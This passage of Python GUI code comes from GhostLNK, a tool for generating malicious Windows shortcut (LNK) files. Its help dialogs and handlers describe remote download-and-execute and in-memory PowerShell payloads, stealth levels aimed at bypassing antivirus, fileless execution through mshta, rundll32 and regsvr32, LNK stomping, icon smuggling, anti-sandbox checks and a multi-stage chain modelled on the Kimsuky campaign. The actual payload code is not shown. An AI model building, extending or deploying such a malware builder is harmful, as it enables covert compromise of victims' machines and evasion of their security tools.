            "debug": "Debug Mode - shows detailed verbose output",
            "hide": "Hide PowerShell Window - runs completely invisibly (may trigger AV)"
        }
        tooltip = base_tooltips.get(option, "")
        relevant_conflicts = [c for c in conflicts if option in c.lower()]
        if relevant_conflicts:
            tooltip += "\n\nDISABLED:\n" + "\n".join(relevant_conflicts)
        return tooltip

    def on_stealth_changed(self):
        stealth = self.stealth_combo.currentIndex()
        hints = [
            "Normal: Standard output, visible window",
            "Moderate: Uses aliases, avoids obvious patterns",
            "Maximum: Obfuscated code, no suspicious flags, AV bypass attempt"
        ]
        self.stealth_hint.setText(hints[stealth])
        stealth_names = ["None", "Moderate", "Maximum"]
        self.stealth_indicator.setText(f"Stealth: {stealth_names[stealth]}")
        self.update_options()

    def on_url_changed(self):
        url = self.url_input.text().strip()
        if 'dropbox.com' in url.lower():
            if 'dl=1' not in url:
                self.dropbox_indicator.setText("WARNING: Missing dl=1! Add &dl=1 to the end")
                self.dropbox_indicator.setStyleSheet("color: #FF6666;")
            else:
                self.dropbox_indicator.setText("OK: dl=1 present")
                self.dropbox_indicator.setStyleSheet("color: #66FF66;")
        else:
            self.dropbox_indicator.setText("")
        if url:
            guessed = PowerShellConverter.guess_payload_type(url)
            if guessed == "memory_execute" and '.ps1' in url.lower():
                self.type_combo.setCurrentIndex(1)

    def on_type_changed(self):
        types = [
            "Download & Open: Saves file to temp and opens it. Best for PDFs, images, documents.",
            "Memory Execute: Downloads and runs PowerShell script in memory. For .ps1 files ONLY!",
            "Ultra Stealth: Minimal output, just executes."
        ]
        self.type_hint.setText(types[self.type_combo.currentIndex()])
        mode_names = ["Download & Open", "Memory Execute", "Ultra Stealth"]
        self.mode_indicator.setText(f"Current Mode: {mode_names[self.type_combo.currentIndex()]}")
        self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")
        self.update_options()

    # ----------------------------------------------------------------------
    # Help Dialogs
    # ----------------------------------------------------------------------
    def show_evasion_help(self):
        QMessageBox.about(self, "Advanced Evasion Techniques",
            "<b>Advanced Evasion Options</b><br><br>"
            "<b>mshta.exe:</b> Executes remote HTA.<br>"
            "<b>rundll32.exe:</b> Executes JavaScript via mshtml.<br>"
            "<b>regsvr32.exe:</b> Fileless SCT/DLL execution.<br>"
            "<b>LNK Stomping:</b> Spoof displayed target path.<br>"
            "<b>Self-Extracting LNK (Hex):</b> Hex-encoded VBS appended; extracted and executed silently.<br>"
            "<b>Kimsuky Campaign:</b> LNK → XML → VBS → PS1 → BAT → Python (full fragmented chain)."
        )

    def show_embed_help(self):
        QMessageBox.about(self, "Embedded Payload (No Network)",
            "<b>Embedded Payload</b><br><br>"
            "Paste a raw PowerShell script. GhostLNK will encode/encrypt it.<br>"
            "<b>Append Mode:</b> Payload appended to LNK, extracted via obfuscated PowerShell reflection stub.<br>"
            "<b>True Icon Smuggling:</b> Embed payload in IconEnvironmentDataBlock (max 500 bytes). Extractor VBS saved alongside LNK.<br>"
            "<b>Self-Extracting LNK (Hex):</b> Hex-encoded VBS appended after marker; cmd extracts and executes. Recommended for maximum evasion."
        )

    def show_raw_help(self):
        QMessageBox.about(self, "Raw Target Mode Guide",
            "<b>Raw Target Mode</b><br><br>"
            "Execute any program directly, bypassing PowerShell entirely."
        )

    def show_mode_guide(self):
        QMessageBox.about(self, "Payload Mode Guide",
            "<b>Download & Open Mode</b><br>"
            "- Saves file to temp folder<br>"
            "- Opens with default application<br>"
            "- Use for: PDFs, images, documents<br><br>"
            "<b>Memory Execute Mode</b><br>"
            "- Downloads and runs PowerShell script in memory<br>"
            "- No files saved to disk<br>"
            "- Use for: .ps1 script files ONLY<br><br>"
            "<b>Ultra Stealth Mode</b><br>"
            "- Minimal output<br>"
            "- Just executes<br>"
            "- Good for background scripts")

    def show_stealth_help(self):
        QMessageBox.about(self, "Stealth Mode Guide",
            "<b>Stealth Levels Explained</b><br><br>"
            "<b>Level 0 - Normal:</b><br>"
            "- Standard PowerShell commands<br>"
            "- Visible window with output<br>"
            "- May trigger AV detection<br><br>"
            "<b>Level 1 - Moderate Stealth:</b><br>"
            "- Uses aliases (iex instead of Invoke-Expression)<br>"
            "- Avoids obvious patterns<br>"
            "- Minimal output<br>"
            "- Better chance of bypassing AV<br><br>"
            "<b>Level 2 - Maximum Stealth (AV Bypass):</b><br>"
            "- Uses obfuscated variable names<br>"
            "- Avoids -WindowStyle Hidden flag<br>"
            "- Uses Start instead of Start-Process<br>"
            "- No comments or unnecessary code<br>"
            "- Best chance of evading detection")

    def show_hide_help(self):
        QMessageBox.about(self, "Hidden PowerShell Window Guide",
            "<b>Hidden PowerShell Window Feature</b><br><br>"
            "<b>What it does:</b><br>"
            "- Adds '-WindowStyle Hidden' to PowerShell arguments<br>"
            "- Runs PowerShell completely invisibly<br>"
            "- No console window appears at all<br><br>"
            "<b>Important Notes:</b><br>"
            "- This flag is well-known to AV (Windows Defender, etc.)<br>"
            "- May trigger detection in security-conscious environments<br>"
            "- For MAXIMUM STEALTH, use Level 2 instead (window minimized, not hidden)")

    def show_about(self):
        QMessageBox.about(self, "About GhostLNK",
            "<b>GhostLNK</b><br><br>"
            "<b>Created by: github.com/Excalibra</b><br><br>"
            "Ultimate LNK Generator with:<br>"
            "> Multiple payload types<br>"
            "> 3 stealth levels<br>"
            "> Hidden PowerShell Window option<br>"
            "> Raw Target Mode<br>"
            "> Advanced Evasion: conhost, mshta, rundll32, regsvr32 proxies<br>"
            "> Multi-Stage Stager (VBS + Scheduled Task)<br>"
            "> Embedded Payload with XOR, String Obfuscation, Append, Binary & True Icon Smuggling<br>"
            "> Self-Extracting LNK (Hex) — hex-encoded VBS for maximum evasion<br>"
            "> Kimsuky‑Style Multi‑Stage Campaign — full fragmented attack package<br>"
            "> Anti-Sandbox Checks<br><br>"
            "For authorized testing only")
